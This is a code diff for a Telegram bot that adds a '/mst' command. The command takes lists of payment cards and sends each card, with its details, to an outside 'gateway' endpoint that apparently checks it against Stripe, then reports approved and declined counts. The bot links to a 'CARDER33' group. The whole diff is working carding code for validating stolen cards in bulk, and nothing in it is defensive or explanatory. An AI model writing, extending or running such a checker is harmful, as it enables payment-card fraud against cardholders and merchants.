@@ -1763,7 +1763,7 @@ async def st_worker(update: Update, card: str, status_msg):
     result_text = (
         f"<b>◇━━〔 {status_fmt} 〕━━◇</b>\n"
         f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{card_fmt}</code>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {escape(gateway_name)}\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝗦𝘁𝗿𝗶𝗽𝗲 \n"
         f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{response_fmt}</i>\n"
         "――――――――――――――――\n"
         f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{brand_fmt}</code>\n"
@@ -1848,6 +1848,170 @@ async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(st_worker(update, cc_normalized, status_msg))
 
 
+
+
+
+# -------------------- /mst Worker --------------------
+import aiohttp
+import asyncio
+import time
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown as mdv2_escape
+
+BULLET_GROUP_LINK = "https://t.me/CARDER33"
+
+async def mst_worker(status_msg, cards: list):
+    bullet = "[⌇]"
+    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
+
+    # Start timing
+    start_time = time.time()
+
+    # Counters
+    total = len(cards)
+    approved = 0
+    declined = 0
+    errors = 0
+
+    # Card results accumulator
+    card_results = []
+
+    # Session for API calls
+    async with aiohttp.ClientSession() as session:
+        for idx, card in enumerate(cards, start=1):
+            try:
+                url = f"https://rockyy.onrender.com/gateway?gateway=st1&key=rockysoon&card={card}"
+                async with session.get(url) as resp:
+                    data = await resp.json()
+
+                status = data.get("status", "ERROR").upper()
+                response = data.get("response", "No response")
+
+                # Counters
+                if status == "APPROVED":
+                    approved += 1
+                    emoji = "✅"
+                elif status == "DECLINED":
+                    declined += 1
+                    emoji = "❌"
+                else:
+                    errors += 1
+                    emoji = "⚠️"
+
+                # Format single card result
+                card_block = (
+                    f"<code>{card}</code>\n"
+                    f"𝗦𝘁𝗮𝘁𝘂𝘀 ➵ {emoji} <i>{response}</i>\n"
+                    "──────── ⸙ ─────────"
+                )
+                card_results.append(card_block)
+
+                # Build updated text (header + processed cards so far)
+                elapsed = time.time() - start_time
+                header = (
+                    f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵\n"
+                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {idx}/{total}\n"
+                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
+                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
+                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
+                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
+                    "──────── ⸙ ─────────\n"
+                )
+
+                final_text = header + "\n".join(card_results)
+
+                # Edit message with new state
+                await status_msg.edit_text(
+                    final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
+                )
+
+                await asyncio.sleep(1)  # small delay so it feels progressive
+
+            except Exception as e:
+                errors += 1
+                card_results.append(
+                    f"<code>{card}</code>\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ⚠️ <i>{str(e)}</i>\n──────── ⸙ ─────────"
+                )
+
+    # Final update (ensures last card + total stats are locked in)
+    elapsed = time.time() - start_time
+    header = (
+        f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵\n"
+        f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {total}/{total}\n"
+        f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
+        f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
+        f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
+        f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
+        "──────── ⸙ ─────────\n"
+    )
+    final_text = header + "\n".join(card_results)
+
+    await status_msg.edit_text(
+        final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
+    )
+
+
+
+# -------------------- /mst Command --------------------
+import time
+import asyncio
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+
+from .mst_worker import mst_worker   # import your worker
+
+# Cooldown tracker
+mst_cooldowns = {}
+
+BULLET_GROUP_LINK = "https://t.me/CARDER33"
+
+def mdv2_escape(text: str) -> str:
+    escape_chars = r"_*[]()~`>#+-=|{}.!"
+    return "".join("\\" + c if c in escape_chars else c for c in text)
+
+async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    now = time.time()
+
+    # Cooldown check (30s per user)
+    if user_id in mst_cooldowns and now - mst_cooldowns[user_id] < 30:
+        remaining = int(30 - (now - mst_cooldowns[user_id]))
+        await update.message.reply_text(f"⏳ Please wait {remaining}s before using /mst again.")
+        return
+    mst_cooldowns[user_id] = now
+
+    # Extract cards (from reply or args)
+    if update.message.reply_to_message:
+        card_text = update.message.reply_to_message.text
+    else:
+        if not context.args:
+            await update.message.reply_text("⚠️ Send cards after /mst or reply with cards.")
+            return
+        card_text = " ".join(context.args)
+
+    cards = [c.strip() for c in card_text.splitlines() if "|" in c]
+    if not cards:
+        await update.message.reply_text("⚠️ No valid cards found.")
+        return
+
+    # Processing text (as you wanted)
+    bullet = "[⌇]"
+    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
+    gateway_text = mdv2_escape("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲1$")
+    status_text = mdv2_escape("𝗦𝘁𝗮𝘁𝘂s ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")
+    initial_text = (
+        f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
+        f"{bullet_link} {gateway_text}\n"
+        f"{bullet_link} {status_text}"
+    )
+
+    status_msg = await update.message.reply_text(
+        initial_text, parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+    # Run worker in background
+    asyncio.create_task(mst_worker(status_msg, cards))
 
 
 
@@ -5344,6 +5508,7 @@ def register_force_join(application):
     application.add_handler(CommandHandler("credits", force_join(credits_command)))
     application.add_handler(CommandHandler("chk", force_join(chk_command)))
     application.add_handler(CommandHandler("st", force_join(st)))
+    application.add_handler(CommandHandler("mst", mst_command))
     application.add_handler(CommandHandler("mass", force_join(mass_handler)))
     application.add_handler(CommandHandler("sh", force_join(sh_command)))
     application.add_handler(CommandHandler("seturl", force_join(seturl)))
